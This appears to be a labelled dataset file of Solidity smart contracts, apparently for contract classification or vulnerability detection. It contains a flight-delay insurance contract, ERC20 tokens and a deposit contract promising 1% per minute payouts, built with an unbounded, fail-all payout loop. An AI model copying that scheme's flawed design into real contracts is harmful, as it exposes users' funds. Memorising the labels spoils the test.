payout);      \/\/ cash out payout\r\r\r\n\r\r\r\n\r\r\r\n\t\t\tif (!p.customer.send(payout))  {\r\r\r\n\t\t\t\tbookkeeping(acc_Balance, acc_Payout, payout);\r\r\r\n\t\t\t\tp.state = policyState.SendFailed;\r\r\r\n\t\t\t\tp.stateMessage = 'Payout, send failed!';\r\r\r\n\t\t\t\tp.actualPayout = 0;\r\r\r\n\t\t\t\tLOG_SendFail(_policyId, 'payout sendfail');\r\r\r\n\t\t\t}\r\r\r\n\t\t\telse {\r\r\r\n\t\t\t\tp.state = policyState.PaidOut;\r\r\r\n\t\t\t\tp.stateMessage = 'Payout successful!';\r\r\r\n\t\t\t\tp.stateTime = now; \/\/ won't be reverted in case of errors\r\r\r\n\t\t\t\tLOG_PolicyPaidOut(_policyId, payout);\r\r\r\n\t\t\t}\r\r\r\n\t\t}\r\r\r\n\r\r\r\n\t}\r\r\r\n\r\r\r\n\t\/\/ fallback function: don't accept ether, except from owner\r\r\r\n\tfunction () onlyOwner {\r\r\r\n\r\r\r\n\t\t\/\/ put additional funds in risk fund.\r\r\r\n\t\tbookkeeping(acc_Balance, acc_RiskFund, msg.value);\r\r\r\n\r\r\r\n\t}\r\r\r\n\r\r\r\n\t\/\/ internal, so no reentrant guard neccessary\r\r\r\n\tfunction getFlightStats(\r\r\r\n\t\tuint _policyId,\r\r\r\n\t\tstring _carrierFlightNumber)\r\r\r\n\t\tinternal {\r\r\r\n\r\r\r\n\t\t\/\/ call oraclize and retrieve the number of observations from flightstats API\r\r\r\n\t\t\/\/ format https:\/\/api.flightstats.com\/flex\/ratings\/rest\/v1\/json\/flight\/OS\/75?appId=**&appKey=**\r\r\r\n\r\r\r\n\t\t\/\/ using nested data sources (query type nested) and partial\r\r\r\n\t\t\/\/ encrypted queries in the next release of oraclize\r\r\r\n\t\t\/\/ note that the first call maps the encrypted string to the\r\r\r\n\t\t\/\/ sending contract address, this string can't be used from any other sender\r\r\r\n\t\tstring memory oraclize_url = strConcat(\r\r\r\n\t\t\toraclize_RatingsBaseUrl,\r\r\r\n\t\t\t_carrierFlightNumber,\r\r\r\n\t\t\toraclizeRatingsQuery\r\r\r\n\t\t\t);\r\r\r\n\r\r\r\n\t\tbytes32 queryId = oraclize_query(\"nested\", oraclize_url, oraclizeGas);\r\r\r\n\t\t\/\/ calculate the spent gas\r\r\r\n\t\tbookkeeping(acc_OraclizeCosts, acc_Balance, uint((-ledger[acc_Balance]) - int(this.balance)));\r\r\r\n\t\toraclizeCallbacks[queryId] = oraclizeCallback(_policyId, oraclizeState.ForUnderwriting, 0);\r\r\r\n\r\r\r\n\t\tLOG_OraclizeCall(_policyId, queryId, oraclize_url);\r\r\r\n\r\r\r\n\t}\r\r\r\n\r\r\r\n\t\/\/ this is a dispatcher, but must be called __callback\r\r\r\n\tfunction __callback(bytes32 _queryId, string _result, bytes _proof) \r\r\r\n\t\tonlyOraclize \r\r\r\n\t\tnoReentrant {\r\r\r\n\r\r\r\n\t\toraclizeCallback o = oraclizeCallbacks[_queryId];\r\r\r\n\t\tLOG_OraclizeCallback(o.policyId, _queryId, _result, _proof);\r\r\r\n\t\t\r\r\r\n\t\tif (o.oState == oraclizeState.ForUnderwriting) {\r\r\r\n            callback_ForUnderwriting(o.policyId, _result, _proof);\r\r\r\n\t\t}\r\r\r\n        else {\r\r\r\n            callback_ForPayout(_queryId, _result, _proof);\r\r\r\n        }\r\r\r\n\t}\r\r\r\n\r\r\r\n\tfunction callback_ForUnderwriting(uint _policyId, string _result, bytes _proof) \r\r\r\n\t\tonlyInState(_policyId, policyState.Applied)\r\r\r\n\t\tinternal {\r\r\r\n\r\r\r\n\t\tvar sl_result = _result.toSlice(); \t\t\r\r\r\n\t\trisk r = risks[policies[_policyId].riskId];\r\r\r\n\r\r\r\n\t\t\/\/ we expect result to contain 6 values, something like\r\r\r\n\t\t\/\/ \"[61, 10, 4, 3, 0, 0]\" ->\r\r\r\n\t\t\/\/ ['observations','late15','late30','late45','cancelled','diverted']\r\r\r\n\r\r\r\n\t\tif (bytes(_result).length == 0) {\r\r\r\n\t\t\tdecline(_policyId, 'Declined (empty result)', _proof);\r\r\r\n\t\t} else {\r\r\r\n\r\r\r\n\t\t\t\/\/ now slice the string using\r\r\r\n\t\t\t\/\/ https:\/\/github.com\/Arachnid\/solidity-stringutils\r\r\r\n\r\r\r\n\t\t\tif (sl_result.count(', '.toSlice()) != 5) { \r\r\r\n\t\t\t\t\/\/ check if result contains 6 values\r\r\r\n\t\t\t\tdecline(_policyId, 'Declined (invalid result)', _proof);\r\r\r\n\t\t\t} else {\r\r\r\n\t\t\t\tsl_result.beyond(\"[\".toSlice()).until(\"]\".toSlice());\r\r\r\n\r\r\r\n\t\t\t\tuint observations = parseInt(\r\r\r\n\t\t\t\t\tsl_result.split(', '.toSlice()).toString());\r\r\r\n\r\r\r\n\t\t\t\t\/\/ decline on < minObservations observations,\r\r\r\n\t\t\t\t\/\/ can't calculate reasonable probabibilities\r\r\r\n\t\t\t\tif (observations <= minObservations) {\r\r\r\n\t\t\t\t\tdecline(_policyId, 'Declined (too few observations)', _proof);\r\r\r\n\t\t\t\t} else {\r\r\r\n\t\t\t\t\tuint[6] memory statistics;\r\r\r\n\t\t\t\t\t\/\/ calculate statistics (scaled by 10000; 1% => 100)\r\r\r\n\t\t\t\t\tstatistics[0] = observations;\r\r\r\n\t\t\t\t\tfor(uint i = 1; i <= 5; i++) {\r\r\r\n\t\t\t\t\t\tstatistics[i] =\r\r\r\n\t\t\t\t\t\t\tparseInt(\r\r\r\n\t\t\t\t\t\t\t\tsl_result.split(', '.toSlice()).toString()) \r\r\r\n\t\t\t\t\t\t\t\t* 10000\/observations;\r\r\r\n\t\t\t\t\t}\r\r\r\n\r\r\r\n\t\t\t\t\t\/\/ underwrite policy\r\r\r\n\t\t\t\t\tunderwrite(_policyId, statistics, _proof);\r\r\r\n\t\t\t\t}\r\r\r\n\t\t\t}\r\r\r\n\t\t}\r\r\r\n\t} \r\r\r\n\r\r\r\n\tfunction callback_ForPayout(bytes32 _queryId, string _result, bytes _proof) internal {\r\r\r\n\r\r\r\n\t\toraclizeCallback o = oraclizeCallbacks[_queryId];\r\r\r\n\t\tuint policyId = o.policyId;\r\r\r\n\t\tvar sl_result = _result.toSlice(); \t\t\r\r\r\n\t\trisk r = risks[policies[policyId].riskId];\r\r\r\n\r\r\r\n\t\tif (bytes(_result).length == 0) {\r\r\r\n\t\t\tif (o.oraclizeTime > r.arrivalTime + 180 minutes) {\r\r\r\n\t\t\t\tLOG_PolicyManualPayout(policyId, 'No Callback at +120 min');\r\r\r\n\t\t\t\treturn;\r\r\r\n\t\t\t} else {\r\r\r\n\t\t\t\tschedulePayoutOraclizeCall(\r\r\r\n\t\t\t\t\tpolicyId, \r\r\r\n\t\t\t\t\tr.carrierFlightNumber, \r\r\r\n\t\t\t\t\tr.departureYearMonthDay, \r\r\r\n\t\t\t\t\to.oraclizeTime + 45 minutes\r\r\r\n\t\t\t\t);\r\r\r\n\t\t\t}\r\r\r\n\t\t} else {\r\r\r\n\t\t\t\t\t\t\r\r\r\n\t\t\t\/\/ first check status\r\r\r\n\r\r\r\n\t\t\t\/\/ extract the status field:\r\r\r\n\t\t\tsl_result.find('\"'.toSlice()).beyond('\"'.toSlice());\r\r\r\n\t\t\tsl_result.until(sl_result.copy().find('\"'.toSlice()));\r\r\r\n\t\t\tbytes1 status = bytes(sl_result.toString())[0];\t\/\/ s = L\r\r\r\n\t\t\t\r\r\r\n\t\t\tif (status == 'C') {\r\r\r\n\t\t\t\t\/\/ flight cancelled --> payout\r\r\r\n\t\t\t\tpayOut(policyId, 4, 0);\r\r\r\n\t\t\t\treturn;\r\r\r\n\t\t\t} else if (status == 'D') {\r\r\r\n\t\t\t\t\/\/ flight diverted --> payout\t\t\t\t\t\r\r\r\n\t\t\t\tpayOut(policyId, 5, 0);\r\r\r\n\t\t\t\treturn;\r\r\r\n\t\t\t} else if (status != 'L' && status != 'A' && status != 'C' && status != 'D') {\r\r\r\n\t\t\t\tLOG_PolicyManualPayout(policyId, 'Unprocessable status');\r\r\r\n\t\t\t\treturn;\r\r\r\n\t\t\t}\r\r\r\n\t\t\t\r\r\r\n\t\t\t\/\/ process the rest of the response:\r\r\r\n\t\t\tsl_result = _result.toSlice();\r\r\r\n\t\t\tbool arrived = sl_result.contains('actualGateArrival'.toSlice());\r\r\r\n\r\r\r\n\t\t\tif (status == 'A' || (status == 'L' && !arrived)) {\r\r\r\n\t\t\t\t\/\/ flight still active or not at gate --> reschedule\r\r\r\n\t\t\t\tif (o.oraclizeTime > r.arrivalTime + 180 minutes) {\r\r\r\n\t\t\t\t\tLOG_PolicyManualPayout(policyId, 'No arrival at +120 min');\r\r\r\n\t\t\t\t} else {\r\r\r\n\t\t\t\t\tschedulePayoutOraclizeCall(\r\r\r\n\t\t\t\t\t\tpolicyId, \r\r\r\n\t\t\t\t\t\tr.carrierFlightNumber, \r\r\r\n\t\t\t\t\t\tr.departureYearMonthDay, \r\r\r\n\t\t\t\t\t\to.oraclizeTime + 45 minutes\r\r\r\n\t\t\t\t\t);\r\r\r\n\t\t\t\t}\r\r\r\n\t\t\t} else if (status == 'L' && arrived) {\r\r\r\n\t\t\t\tvar aG = '\"arrivalGateDelayMinutes\": '.toSlice();\r\r\r\n\t\t\t\tif (sl_result.contains(aG)) {\r\r\r\n\t\t\t\t\tsl_result.find(aG).beyond(aG);\r\r\r\n\t\t\t\t\tsl_result.until(sl_result.copy().find('\"'.toSlice())\r\r\r\n\t\t\t\t\t\t.beyond('\"'.toSlice()));\r\r\r\n\t\t\t\t\tsl_result.until(sl_result.copy().find('}'.toSlice()));\r\r\r\n\t\t\t\t\tsl_result.until(sl_result.copy().find(','.toSlice()));\r\r\r\n\t\t\t\t\tuint delayInMinutes = parseInt(sl_result.toString());\r\r\r\n\t\t\t\t} else {\r\r\r\n\t\t\t\t\tdelayInMinutes = 0;\r\r\r\n\t\t\t\t}\r\r\r\n\t\t\t\t\r\r\r\n\t\t\t\tif (delayInMinutes < 15) {\r\r\r\n\t\t\t\t\tpayOut(policyId, 0, 0);\r\r\r\n\t\t\t\t} else if (delayInMinutes < 30) {\r\r\r\n\t\t\t\t\tpayOut(policyId, 1, delayInMinutes);\r\r\r\n\t\t\t\t} else if (delayInMinutes < 45) {\r\r\r\n\t\t\t\t\tpayOut(policyId, 2, delayInMinutes);\r\r\r\n\t\t\t\t} else {\r\r\r\n\t\t\t\t\tpayOut(policyId, 3, delayInMinutes);\r\r\r\n\t\t\t\t}\r\r\r\n\t\t\t} else { \/\/ no delay info\r\r\r\n\t\t\t\tpayOut(policyId, 0, 0);\r\r\r\n\t\t\t}\r\r\r\n\t\t} \r\r\r\n\t}\r\r\r\n}\r\r\r\n\r\r\r\n\r\r\r\n\r\r\r\n\r\r\r\n\/* EOF *\/","label":0}
{"code":"pragma solidity ^0.4.16;\r\r\n\r\r\ncontract owned {\r\r\n    address public owner;\r\r\n\r\r\n    function owned() public {\r\r\n        owner = msg.sender;\r\r\n    }\r\r\n\r\r\n    modifier onlyOwner {\r\r\n        require(msg.sender == owner);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    function transferOwnership(address newOwner) onlyOwner public {\r\r\n        owner = newOwner;\r\r\n    }\r\r\n}\r\r\n\r\r\ninterface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }\r\r\n\r\r\ncontract TokenERC20 {\r\r\n    \/\/ Public variables of the token\r\r\n    string public name = &#39;SuperNebulaChain&#39;;\r\r\n    string public symbol = &#39;SNBC&#39;;\r\r\n    uint8 public decimals = 1;\r\r\n    \/\/ 18 decimals is the strongly suggested default, avoid changing it\r\r\n    uint256 public totalSupply;\r\r\n\r\r\n    \/\/ This creates an array with all balances\r\r\n    mapping (address => uint256) public balanceOf;\r\r\n    mapping (address => mapping (address => uint256)) public allowance;\r\r\n\r\r\n    \/\/ This generates a public event on the blockchain that will notify clients\r\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\r\n\r\r\n    \/\/ This notifies clients about the amount burnt\r\r\n    event Burn(address indexed from, uint256 value);\r\r\n\r\r\n    \/**\r\r\n     * Constrctor function\r\r\n     *\r\r\n     * Initializes contract with initial supply tokens to the creator of the contract\r\r\n     *\/\r\r\n    function TokenERC20(\r\r\n        uint256 initialSupply,\r\r\n        string tokenName,\r\r\n        string tokenSymbol\r\r\n    ) public {\r\r\n        totalSupply = initialSupply * 10 ** uint256(decimals);  \/\/ Update total supply with the decimal amount\r\r\n        balanceOf[msg.sender] = totalSupply;                \/\/ Give the creator all initial tokens\r\r\n        name = tokenName;                                   \/\/ Set the name for display purposes\r\r\n        symbol = tokenSymbol;                               \/\/ Set the symbol for display purposes\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Internal transfer, only can be called by this contract\r\r\n     *\/\r\r\n    function _transfer(address _from, address _to, uint _value) internal {\r\r\n        \/\/ Prevent transfer to 0x0 address. Use burn() instead\r\r\n        require(_to != 0x0);\r\r\n        \/\/ Check if the sender has enough\r\r\n        require(balanceOf[_from] >= _value);\r\r\n        \/\/ Check for overflows\r\r\n        require(balanceOf[_to] + _value > balanceOf[_to]);\r\r\n        \/\/ Save this for an assertion in the future\r\r\n        uint previousBalances = balanceOf[_from] + balanceOf[_to];\r\r\n        \/\/ Subtract from the sender\r\r\n        balanceOf[_from] -= _value;\r\r\n        \/\/ Add the same to the recipient\r\r\n        balanceOf[_to] += _value;\r\r\n        Transfer(_from, _to, _value);\r\r\n        \/\/ Asserts are used to use static analysis to find bugs in your code. They should never fail\r\r\n        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Transfer tokens\r\r\n     *\r\r\n     * Send `_value` tokens to `_to` from your account\r\r\n     *\r\r\n     * @param _to The address of the recipient\r\r\n     * @param _value the amount to send\r\r\n     *\/\r\r\n    function transfer(address _to, uint256 _value) public {\r\r\n        _transfer(msg.sender, _to, _value);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Transfer tokens from other address\r\r\n     *\r\r\n     * Send `_value` tokens to `_to` in behalf of `_from`\r\r\n     *\r\r\n     * @param _from The address of the sender\r\r\n     * @param _to The address of the recipient\r\r\n     * @param _value the amount to send\r\r\n     *\/\r\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\r\n        require(_value <= allowance[_from][msg.sender]);     \/\/ Check allowance\r\r\n        allowance[_from][msg.sender] -= _value;\r\r\n        _transfer(_from, _to, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Set allowance for other address\r\r\n     *\r\r\n     * Allows `_spender` to spend no more than `_value` tokens in your behalf\r\r\n     *\r\r\n     * @param _spender The address authorized to spend\r\r\n     * @param _value the max amount they can spend\r\r\n     *\/\r\r\n    function approve(address _spender, uint256 _value) public\r\r\n        returns (bool success) {\r\r\n        allowance[msg.sender][_spender] = _value;\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Set allowance for other address and notify\r\r\n     *\r\r\n     * Allows `_spender` to spend no more than `_value` tokens in your behalf, and then ping the contract about it\r\r\n     *\r\r\n     * @param _spender The address authorized to spend\r\r\n     * @param _value the max amount they can spend\r\r\n     * @param _extraData some extra information to send to the approved contract\r\r\n     *\/\r\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData)\r\r\n        public\r\r\n        returns (bool success) {\r\r\n        tokenRecipient spender = tokenRecipient(_spender);\r\r\n        if (approve(_spender, _value)) {\r\r\n            spender.receiveApproval(msg.sender, _value, this, _extraData);\r\r\n            return true;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Destroy tokens\r\r\n     *\r\r\n     * Remove `_value` tokens from the system irreversibly\r\r\n     *\r\r\n     * @param _value the amount of money to burn\r\r\n     *\/\r\r\n    function burn(uint256 _value) public returns (bool success) {\r\r\n        require(balanceOf[msg.sender] >= _value);   \/\/ Check if the sender has enough\r\r\n        balanceOf[msg.sender] -= _value;            \/\/ Subtract from the sender\r\r\n        totalSupply -= _value;                      \/\/ Updates totalSupply\r\r\n        Burn(msg.sender, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Destroy tokens from other account\r\r\n     *\r\r\n     * Remove `_value` tokens from the system irreversibly on behalf of `_from`.\r\r\n     *\r\r\n     * @param _from the address of the sender\r\r\n     * @param _value the amount of money to burn\r\r\n     *\/\r\r\n    function burnFrom(address _from, uint256 _value) public returns (bool success) {\r\r\n        require(balanceOf[_from] >= _value);                \/\/ Check if the targeted balance is enough\r\r\n        require(_value <= allowance[_from][msg.sender]);    \/\/ Check allowance\r\r\n        balanceOf[_from] -= _value;                         \/\/ Subtract from the targeted balance\r\r\n        allowance[_from][msg.sender] -= _value;             \/\/ Subtract from the sender&#39;s allowance\r\r\n        totalSupply -= _value;                              \/\/ Update totalSupply\r\r\n        Burn(_from, _value);\r\r\n        return true;\r\r\n    }\r\r\n}\r\r\n\r\r\n\/******************************************\/\r\r\n\/*       ADVANCED TOKEN STARTS HERE       *\/\r\r\n\/******************************************\/\r\r\n\r\r\ncontract SuperNebulaChain is owned, TokenERC20 {\r\r\n\r\r\n    uint256 public sellPrice;\r\r\n    uint256 public buyPrice;\r\r\n\r\r\n    mapping (address => bool) public frozenAccount;\r\r\n\r\r\n    \/* This generates a public event on the blockchain that will notify clients *\/\r\r\n    event FrozenFunds(address target, bool frozen);\r\r\n\r\r\n    \/* Initializes contract with initial supply tokens to the creator of the contract *\/\r\r\n    function SuperNebulaChain(\r\r\n        uint256 initialSupply,\r\r\n        string tokenName,\r\r\n        string tokenSymbol\r\r\n    ) TokenERC20(initialSupply, tokenName, tokenSymbol) public {}\r\r\n\r\r\n    \/* Internal transfer, only can be called by this contract *\/\r\r\n    function _transfer(address _from, address _to, uint _value) internal {\r\r\n        require (_to != 0x0);                               \/\/ Prevent transfer to 0x0 address. Use burn() instead\r\r\n        require (balanceOf[_from] >= _value);               \/\/ Check if the sender has enough\r\r\n        require (balanceOf[_to] + _value > balanceOf[_to]); \/\/ Check for overflows\r\r\n        require(!frozenAccount[_from]);                     \/\/ Check if sender is frozen\r\r\n        require(!frozenAccount[_to]);                       \/\/ Check if recipient is frozen\r\r\n        balanceOf[_from] -= _value;                         \/\/ Subtract from the sender\r\r\n        balanceOf[_to] += _value;                           \/\/ Add the same to the recipient\r\r\n        Transfer(_from, _to, _value);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice Create `mintedAmount` tokens and send it to `target`\r\r\n    \/\/\/ @param target Address to receive the tokens\r\r\n    \/\/\/ @param mintedAmount the amount of tokens it will receive\r\r\n    function mintToken(address target, uint256 mintedAmount) onlyOwner public {\r\r\n        balanceOf[target] += mintedAmount;\r\r\n        totalSupply += mintedAmount;\r\r\n        Transfer(0, this, mintedAmount);\r\r\n        Transfer(this, target, mintedAmount);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice `freeze? Prevent | Allow` `target` from sending & receiving tokens\r\r\n    \/\/\/ @param target Address to be frozen\r\r\n    \/\/\/ @param freeze either to freeze it or not\r\r\n    function freezeAccount(address target, bool freeze) onlyOwner public {\r\r\n        frozenAccount[target] = freeze;\r\r\n        FrozenFunds(target, freeze);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice Allow users to buy tokens for `newBuyPrice` eth and sell tokens for `newSellPrice` eth\r\r\n    \/\/\/ @param newSellPrice Price the users can sell to the contract\r\r\n    \/\/\/ @param newBuyPrice Price users can buy from the contract\r\r\n    function setPrices(uint256 newSellPrice, uint256 newBuyPrice) onlyOwner public {\r\r\n        sellPrice = newSellPrice;\r\r\n        buyPrice = newBuyPrice;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice Buy tokens from contract by sending ether\r\r\n    function buy() payable public {\r\r\n        uint amount = msg.value \/ buyPrice;               \/\/ calculates the amount\r\r\n        _transfer(this, msg.sender, amount);              \/\/ makes the transfers\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice Sell `amount` tokens to contract\r\r\n    \/\/\/ @param amount amount of tokens to be sold\r\r\n    function sell(uint256 amount) public {\r\r\n        require(this.balance >= amount * sellPrice);      \/\/ checks if the contract has enough ether to buy\r\r\n        _transfer(msg.sender, this, amount);              \/\/ makes the transfers\r\r\n        msg.sender.transfer(amount * sellPrice);          \/\/ sends ether to the seller. It&#39;s important to do this last to avoid recursion attacks\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.11;\r\r\n\r\r\ncontract BLOCKCHAIN_DEPOSIT_BETA_1M {\r\r\n\t\r\r\n\t\/* CONTRACT SETUP *\/\r\r\n\r\r\n\tuint constant PAYOUT_INTERVAL = 1 minutes;\r\r\n\r\r\n\t\/* NB: Solidity doesn&#39;t support fixed or floats yet, so we use promille instead of percent *\/\t\r\r\n\tuint constant DEPONENT_INTEREST= 10;\r\r\n\tuint constant INTEREST_DENOMINATOR = 1000;\r\r\n\r\r\n\t\/* DATA TYPES *\/\r\r\n\r\r\n\t\/* the payout happend *\/\r\r\n\tevent Payout(uint paidPeriods, uint depositors);\r\r\n\t\r\r\n\t\/* Depositor struct: describes a single Depositor *\/\r\r\n\tstruct Depositor\r\r\n\t{\t\r\r\n\t\taddress etherAddress;\r\r\n\t\tuint deposit;\r\r\n\t\tuint depositTime;\r\r\n\t}\r\r\n\r\r\n\t\/* FUNCTION MODIFIERS *\/\r\r\n\tmodifier founderOnly { if (msg.sender == contract_founder) _; }\r\r\n\r\r\n\t\/* VARIABLE DECLARATIONS *\/\r\r\n\r\r\n\t\/* the contract founder*\/\r\r\n\taddress private contract_founder;\r\r\n\r\r\n\t\/* the time of last payout *\/\r\r\n\tuint private contract_latestPayoutTime;\r\r\n\r\r\n\t\/* Array of depositors *\/\r\r\n\tDepositor[] private contract_depositors;\r\r\n\r\r\n\t\r\r\n\t\/* PUBLIC FUNCTIONS *\/\r\r\n\r\r\n\t\/* contract constructor *\/\r\r\n\tfunction BLOCKCHAIN_DEPOSIT_BETA_1M() \r\r\n\t{\r\r\n\t\tcontract_founder = msg.sender;\r\r\n\t\tcontract_latestPayoutTime = now;\t\t\r\r\n\t}\r\r\n\r\r\n\t\/* fallback function: called when the contract received plain ether *\/\r\r\n\tfunction() payable\r\r\n\t{\r\r\n\t\taddDepositor();\r\r\n\t}\r\r\n\r\r\n\tfunction Make_Deposit() payable\r\r\n\t{\r\r\n\t\taddDepositor();\t\r\r\n\t}\r\r\n\r\r\n\tfunction status() constant returns (uint deposit_fond_sum, uint depositorsCount, uint unpaidTime, uint unpaidIntervals)\r\r\n\t{\r\r\n\t\tdeposit_fond_sum = this.balance;\r\r\n\t\tdepositorsCount = contract_depositors.length;\r\r\n\t\tunpaidTime = now - contract_latestPayoutTime;\r\r\n\t\tunpaidIntervals = unpaidTime \/ PAYOUT_INTERVAL;\r\r\n\t}\r\r\n\r\r\n\r\r\n\t\/* checks if it&#39;s time to make payouts. if so, send the ether *\/\r\r\n\tfunction performPayouts()\r\r\n\t{\r\r\n\t\tuint paidPeriods = 0;\r\r\n\t\tuint depositorsDepositPayout;\r\r\n\r\r\n\t\twhile(contract_latestPayoutTime + PAYOUT_INTERVAL < now)\r\r\n\t\t{\t\t\t\t\t\t\r\r\n\t\t\tuint idx;\r\r\n\r\r\n\t\t\t\/* pay the depositors  *\/\r\r\n\t\t\t\/* we use reverse iteration here *\/\r\r\n\t\t\tfor (idx = contract_depositors.length; idx-- > 0; )\r\r\n\t\t\t{\r\r\n\t\t\t\tif(contract_depositors[idx].depositTime > contract_latestPayoutTime + PAYOUT_INTERVAL)\r\r\n\t\t\t\t\tcontinue;\r\r\n\t\t\t\tuint payout = (contract_depositors[idx].deposit * DEPONENT_INTEREST) \/ INTEREST_DENOMINATOR;\r\r\n\t\t\t\tif(!contract_depositors[idx].etherAddress.send(payout))\r\r\n\t\t\t\t\tthrow;\r\r\n\t\t\t\tdepositorsDepositPayout += payout;\t\r\r\n\t\t\t}\r\r\n\t\t\t\r\r\n\t\t\t\/* save the latest paid time *\/\r\r\n\t\t\tcontract_latestPayoutTime += PAYOUT_INTERVAL;\r\r\n\t\t\tpaidPeriods++;\r\r\n\t\t}\r\r\n\t\t\t\r\r\n\t\t\/* emit the Payout event *\/\r\r\n\t\tPayout(paidPeriods, depositorsDepositPayout);\r\r\n\t}\r\r\n\r\r\n\t\/* PRIVATE FUNCTIONS *\/\r\r\n\tfunction addDepositor() private \r\r\n\t{\r\r\n\t\tcontract_depositors.push(Depositor(msg.sender, msg.value, now));\r\r\n\t}\r\r\n\r\r\n\t\/* ADMIN FUNCTIONS *\/\r\r\n\r\r\n\t\/* pass the admin rights to another address *\/\r\r\n\tfunction changeFounderAddress(address newFounder) founderOnly \r\r\n\t{\r\r\n\t\tcontract_founder = newFounder;\r\r\n\t}\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.9;\r\r\n\r\r\n\/**\r\r\n * Math operations with safety checks\r\r\n *\/\r\r\nlibrary SafeMath {\r\r\n  function mul(uint256 a, uint256 b) internal returns (uint256) {\r\r\n    uint256 c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function div(uint256 a, uint256 b) internal returns (uint256) {\r\r\n    \/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n    uint256 c = a \/ b;\r\r\n    \/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn&#39;t hold\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function sub(uint256 a, uint256 b) internal returns (uint256) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function add(uint256 a, uint256 b) internal returns (uint256) {\r\r\n    uint256 c = a + b;\r\r\n    assert(c >= a);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function max64(uint64 a, uint64 b) internal constant returns (uint64) {\r\r\n    return a >= b ? a : b;\r\r\n  }\r\r\n\r\r\n  function min64(uint64 a, uint64 b) internal constant returns (uint64) {\r\r\n    return a < b ? a : b;\r\r\n  }\r\r\n\r\r\n  function max256(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    return a >= b ? a : b;\r\r\n  }\r\r\n\r\r\n  function min256(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    return a < b ? a : b;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/**\r\r\n\t * @title ERC20Basic\r\r\n\t * @dev Simpler version of ERC20 interface\r\r\n\t * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n\t *\/\r\r\ncontract ERC20Basic {\r\r\n\t  uint256 public totalSupply;\r\r\n\t  function balanceOf(address who) constant returns (uint256);\r\r\n\t  function transfer(address to, uint256 value);\r\r\n\t  event Transfer(address indexed from, address indexed to, uint256 value);\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20 is ERC20Basic {\r\r\n  function allowance(address owner, address spender) constant returns (uint256);\r\r\n  function transferFrom(address from, address to, uint256 value);\r\r\n  function approve(address spender, uint256 value);\r\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\r\n}\r\r\n\r\r\ncontract BasicToken is ERC20Basic {\r\r\n  using SafeMath for uint256;\r\r\n\r\r\n  mapping(address => uint256) balances;\r\r\n\r\r\n  \/**\r\r\n   * @dev Fix for the ERC20 short address attack.\r\r\n   *\/\r\r\n  modifier onlyPayloadSize(uint256 size) {\r\r\n     require(!(msg.data.length < size + 4));\r\r\n     _;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n  * @dev transfer token for a specified address\r\r\n  * @param _to The address to transfer to.\r\r\n  * @param _value The amount to be transferred.\r\r\n  *\/\r\r\n  function transfer(address _to, uint256 _value) onlyPayloadSize(2 * 32) {\r\r\n    balances[msg.sender] = balances[msg.sender].sub(_value);\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    Transfer(msg.sender, _to, _value);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n  * @dev Gets the balance of the specified address.\r\r\n  * @param _owner The address to query the the balance of. \r\r\n  * @return An uint256 representing the amount owned by the passed address.\r\r\n  *\/\r\r\n  function balanceOf(address _owner) constant returns (uint256 balance) {\r\r\n    return balances[_owner];\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title Standard ERC20 token\r\r\n *\r\r\n * @dev Implemantation of the basic standart token.\r\r\n * @dev https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n * @dev Based on code by FirstBlood: https:\/\/github.com\/Firstbloodio\/token\/blob\/master\/smart_contract\/FirstBloodToken.sol\r\r\n *\/\r\r\ncontract StandardToken is BasicToken, ERC20 {\r\r\n\r\r\n  mapping (address => mapping (address => uint256)) allowed;\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Transfer tokens from one address to another\r\r\n   * @param _from address The address which you want to send tokens from\r\r\n   * @param _to address The address which you want to transfer to\r\r\n   * @param _value uint256 the amout of tokens to be transfered\r\r\n   *\/\r\r\n  function transferFrom(address _from, address _to, uint256 _value) onlyPayloadSize(3 * 32) {\r\r\n    var _allowance = allowed[_from][msg.sender];\r\r\n\r\r\n    \/\/ Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\r\r\n    \/\/ if (_value > _allowance) throw;\r\r\n\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    balances[_from] = balances[_from].sub(_value);\r\r\n    allowed[_from][msg.sender] = 